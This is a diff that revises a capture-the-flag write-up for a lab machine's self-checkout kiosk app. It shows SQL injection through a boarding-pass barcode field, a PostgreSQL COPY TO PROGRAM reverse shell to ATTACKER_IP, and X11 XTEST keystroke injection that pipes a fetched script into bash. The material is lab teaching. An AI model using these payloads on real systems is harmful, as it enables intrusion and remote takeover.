@@ -11,7 +11,7 @@ tags:
   - WEB
   - LINUX
   - ACTIVE-MACHINE
-draft: true
+cover: /mdx_images/dutybound/cover.png
 ---
 # بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
 
@@ -20,16 +20,7 @@ this one is a self-checkout kiosk app , and the whole thing starts from a boardi
 
 ## Recon
 
-```bash
-$ nmap -sCV 10.129.22.XXX
-
-PORT    STATE SERVICE
-22/tcp  open  ssh
-80/tcp  open  http
-443/tcp open  https
-```
-
-full scan gives nothing more , so let's fingerprint the services
+the service scan shows SSH, HTTP and HTTPS , plus the HTTPS vhost :
 
 ```bash
 $ nmap -Pn -n -sCV -p22,80,443 10.129.22.XXX
@@ -41,15 +32,13 @@ $ nmap -Pn -n -sCV -p22,80,443 10.129.22.XXX
 |_http-title: Welcome · airsnacks Self-Checkout
 ```
 
-we found port 80 and 443 , so the Machine is hosting a Application web 
-
-so we add the host to /etc/hosts and move to the website
+the writeup is for **DutyBound**; **AirSnacks** is the name on its web app and TLS certificate. add `airsnacks.htb` to `/etc/hosts` and move to the site
 
 ## Website
 
 the app is a kiosk / POS interface , it says **Self-service checkout** and there is a warning that the barcode scanner is out of service
 
-we got these routes by browsing
+we got these routes by browsing and using burpsuite web scraber
 
 ```text
 /                       attract screen
@@ -175,9 +164,10 @@ the name field is 20 chars and it is heavily validated. injecting there does not
 
 ```bash
 $ curl -s https://airsnacks.htb/checkout/boarding-pass/verify -d '{"raw":"...DOE/JO'\''M..."}'
+
 {"detail":"expected SURNAME/GIVEN, A-Z only","error":"BCBP_ERR_NAME_FORMAT"}
 ```
-after injecting the \' in every field i found that the last part the **airline use** section , is free-form by design. that is where airlines put their own data , so the parser does not validate its content at all.
+after trying a quote in the parsed fields , the last part , the **airline use** section , is free-form by design. that is where airlines put their own data , so the parser accepts the quote.
 
 to confirm it is the last quoted value of the INSERT , just put a quote in it and read the error :
 
@@ -196,38 +186,62 @@ that error gives us the whole query shape :
 ```sql
 INSERT INTO audit (...) VALUES (
   '<audit_ref>', 'dutyfree-kiosk7', now(), 'ABC1234',
-  '<name>', 'AT', '0210', '297', 'CMN', 'CDG', '', '', 95, '<airline_use>'
+  '<name>', 'AT', '0210', '297', 'CMN', 'CDG', '', '', 95, '<Hello_part>'
 )
 ```
 
-our input is the **last string literal** , and the only thing after it is `)`. and note the `95` , that is the length of the raw string we sent , so the length column is not a problem.
+our input is the **last string literal** , and the only thing after it is `)`. the error also shows the raw-string length as `95` in this example.
 
 ## Building the SQL injection
 
-so after find the source , we gonna build the payload to test it first we gonna fire first the sleep 
+we need to close the quoted value and the `VALUES(...)`, run a second statement, then comment out the leftover quote and parenthesis. the payload shape is `'); SELECT pg_sleep(4);--`.
 
-[public\mc\images\SQLinjection.png]
+the parser also checks the two hex length bytes at offsets 58-59 , so changing the tail without recalculating its length fails before SQL. here's a request builder using the valid pass above :
+
+```python
+import json
+
+name = "SMITH/JOHN".ljust(20)
+block58 = ("M1" + name + "E" + "ABC1234" + "CMN" + "CDG" + "AT "
+           + "0210 " + "297" + "Y" + "012A" + "0000A" + "1")
+header = ">70B0WW6297BAT 0D1471234567890"
+payload = "'); SELECT pg_sleep(4);--"
+tail = header + payload
+assert len(block58) == 58 and len(tail) <= 255
+raw = block58 + f"{len(tail):02X}" + tail
+print(json.dumps({"raw": raw}))
+```
+
+save the builder output to `request.json` and send it :
+
+```bash
+$ python3 build_pass.py > request.json
+$ curl -sk -H 'Content-Type: application/json' --data-binary @request.json https://airsnacks.htb/checkout/boarding-pass/verify
+```
+
+the Burp request below returned `200 OK` after roughly 5.3 seconds with `pg_sleep(4)` in the airline-use field. a single slow response is not a timing baseline , but the later shell confirms this was more than a slow normal request.
+
+![Burp request containing the pg_sleep(4) payload and its delayed 200 response](/mc/images/SQLinjection.png)
 
 
 ## Initial Access
 
-so we gonna try now to fire a shell 
+with stacked SQL working , we gonna try to fire a shell. `COPY ... TO PROGRAM` executes a shell command on the database host if the PostgreSQL role has that privilege :
 
 ```sql
 COPY (SELECT '') TO PROGRAM 'our command';
 ```
-so to get the shell we gonna try to use base64 and decode it inside and execute
+the command needs the same `');` prefix and `;--` suffix as the timing probe. in `build_pass.py`, replace the `payload = ...` line above with this (add the import at the top), then rerun the builder to recalculate the pass length :
 
-so first we gonna encode the payload 
-```
-echo "bash -i >& /dev/tcp/ip/port >&1" |base64
-YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0ID4mMQo=
+```python
+import base64
+
+shell = "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
+encoded = base64.b64encode(shell.encode()).decode()
+payload = f"');COPY (SELECT '') TO PROGRAM 'echo {encoded} | base64 -d | bash';--"
 ```
 
-after that we gonna execute it with TO PROGRAM
-```sql
-COPY (SELECT '') TO PROGRAM 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0ID4mMQo= | base64 -d | bash';--
-```
+replace `ATTACKER_IP` with your  IP , start the listener , and send the generated JSON to the same verify endpoint. the database session can stay open while the reverse shell is running :
 ```bash
 $ nc -lvnp 4444
 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.129.22.XX]
@@ -253,21 +267,22 @@ drwxrwxrwt 2 root root 4096 /tmp/.X11-unix
 srwxrwxrwx 1 root root    0 /tmp/.X11-unix/X0
 ```
 
-`777` on the socket means **any local user can connect to display :0** , and X11 does not ask who you are. on top of that , X11 exposes the `XTEST` extension , which lets a client **inject keyboard and mouse events**.
+the socket permissions allow a local connection attempt , but X11 can still enforce authorization (Xorg was started with `-auth`). what matters here is that a connection as `postgres` actually succeeded. with access to this display , `XTEST` lets us inject keyboard and mouse events.
 
 ```bash
 $ DISPLAY=:0 python3 -c 'from Xlib import display; d=display.Display(); print("connected", d.screen_count())'
 connected 1
 ```
 
-so we can type into the kiosk user's own desktop. open a terminal with `Ctrl+Alt+T` and wait for it , then type our command
+so we can type into the kiosk user's own desktop. first create `shell.sh` on our box :
 
-first we gonna create shell.sh in our host
-```
-ζ cat shell.sh                                                                                                 
+```bash
+ζ cat shell.sh
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.1X.XXX/4445 0>&1
 ```
+
+host it with `python3 -m http.server 8000` and listen on port `4445`. then open a terminal with `Ctrl+Alt+T` and type the fetch command :
 
 ```python
 from Xlib import X, XK, display
@@ -299,7 +314,7 @@ xtest.fake_input(d, X.KeyRelease, ctrl)
 d.sync()
 time.sleep(2)
 
-cmd = "curl -fsS http://your_ip/shell.sh|bash"
+cmd = "curl -fsS http://ATTACKER_IP:8000/shell.sh|bash"
 for c in cmd:
     if   c == ":": key("semicolon", "Shift_L")
     elif c == "|": key("backslash", "Shift_L")
@@ -320,22 +335,18 @@ dutyfree-kiosk@dutyfree-kiosk7:~$ id
 uid=1000(dutyfree-kiosk) gid=1000(dutyfree-kiosk) groups=1000(dutyfree-kiosk),1001(pos-ops)
 ```
 
-## user.txt
-
-```bash
-dutyfree-kiosk@dutyfree-kiosk7:~$ cat user.txt
-```
 so after enumerating the user , we found out that he is with group pos-ops
 
 ## Privilege escalation
 
-first thing we look at is what runs as root and touches something our group owns , also there is some script in /opt/vrs
+first thing we look at is what runs as root and touches something our group owns , also there is some script in /opt/vrs (u could find them with Linpeas.sh)
 
 ```bash
-dutyfree-kiosk@dutyfree-kiosk7:~$ find /etc/systemd/system -type f \( -name '*duty*' -o -name '*vrs*' \)
+dutyfree-kiosk@dutyfree-kiosk7:~$ ls /etc/systemd/system
 /etc/systemd/system/vrs-duty-apply.path
 /etc/systemd/system/vrs-duty-apply.service
 ```
+i opened both to see what triggered the service and what it ran :
 
 ```ini
 # vrs-duty-apply.path
